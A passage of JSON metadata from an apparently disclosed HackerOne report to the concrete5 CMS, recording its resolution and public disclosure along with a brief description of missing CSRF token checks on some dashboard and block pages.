            "message": "I just mean that we get many duplicates for every issue and it's much easier to mark a single issue done than it is to mark a group of issues. That said, all of these things appear to be resolved in the upstream.\n\nThanks!", 
            "markdown_message": "<p>I just mean that we get many duplicates for every issue and it&#39;s much easier to mark a single issue done than it is to mark a group of issues. That said, all of these things appear to be resolved in the upstream.</p>\n\n<p>Thanks!</p>\n", 
            "type": "Activities::BugResolved", 
            "id": 733636, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-05-27T18:27:57.954Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-05-27T18:27:57.954Z", 
            "actor": {
                "username": "egix", 
                "url": "/egix", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/001/431/92370e402d31aa527a1cba9b40e80c7f5d39e586_medium.jpg?1429523399"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "concrete5", 
            "first_to_agree": true, 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::AgreedOnGoingPublic", 
            "id": 987813, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-06-26T18:28:02.740Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-06-26T18:28:02.740Z", 
            "actor": {
                "url": "/concrete5", 
                "profile": {
                    "name": "concrete5"
                }, 
                "ibb": false, 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/000/060/80201c838134b35b9b1acd99ad8a7a7c214aa374_medium.jpg?1393279055"
                }
            }, 
            "team_handle": "concrete5", 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::ReportBecamePublic", 
            "id": 1038258, 
            "genius_execution_id": null
        }
    ], 
    "in_validation?": false, 
    "is_participant": false, 
    "singular_disclosure_allowed": true, 
    "reporter": {
        "username": "egix", 
        "hacker_mediation": false, 
        "hackerone_triager": false, 
        "disabled": false, 
        "url": "/egix", 
        "profile_picture_urls": {
            "small": "https://profile-photos.hackerone-user-content.com/000/001/431/ae9fe2c774dc18d0c961ba8ade2248b8ce758445_small.jpg?1429523399"
        }, 
        "is_me?": false
    }, 
    "weakness": {
        "id": 45, 
        "name": "Cross-Site Request Forgery (CSRF)"
    }, 
    "is_external_bug": false, 
    "visibility": "full", 
    "allow_singular_disclosure_after": -77171073.91483524, 
    "disclosed_at": "2016-06-26T18:28:02.667Z", 
    "stage": 4, 
    "url": "https://hackerone.com/reports/59660", 
    "created_at": "2015-05-05T09:18:16.152Z", 
    "original_report_url": null, 
    "vulnerability_information_html": "<p>Concrete5 implements a Synchronizer Token Pattern in order to provide anti-CSRF capabilities, which is done within the Concrete\\Core\\Validation\\CSRF\\Token class. However, the application fails to properly use this feature in every block or dashboard page which makes a system state change, such as settings modification. As a result, the application is vulnerable to some Cross Site Request Forgery (CSRF) attacks.</p>\n", 
    "vulnerability_information": "Concrete5 implements a Synchronizer Token Pattern in order to provide anti-CSRF capabilities, which is done within the Concrete\\Core\\Validation\\CSRF\\Token class. However, the application fails to properly use this feature in every block or dashboard page which makes a system state change, such as settings modification. As a result, the application is vulnerable to some Cross Site Request Forgery (CSRF) attacks.", 
    "team_private?": false, 
    "team": {
        "profile": {
            "website": "https://www.concrete5.org", 
            "about": "A simple and powerful content management system.", 
            "twitter_handle": "concrete5", 
            "name": "concrete5"
        }, 
        "handle": "concrete5", 
        "url": "https://hackerone.com/concrete5", 
        "state": "public_mode", 
        "profile_picture_urls": {
            "small": "https://profile-photos.hackerone-user-content.com/000/000/060/622f9171a70969f5b0edaf2c826c92ea6e022fb3_small.jpg?1393279055", 
            "medium": "https://profile-photos.hackerone-user-content.com/000/000/060/80201c838134b35b9b1acd99ad8a7a7c214aa374_medium.jpg?1393279055"
        }, 
        "awards_miles": false, 
        "permissions": [], 
        "id": 60, 
        "default_currency": "usd"
    }, 
    "is_published": false
}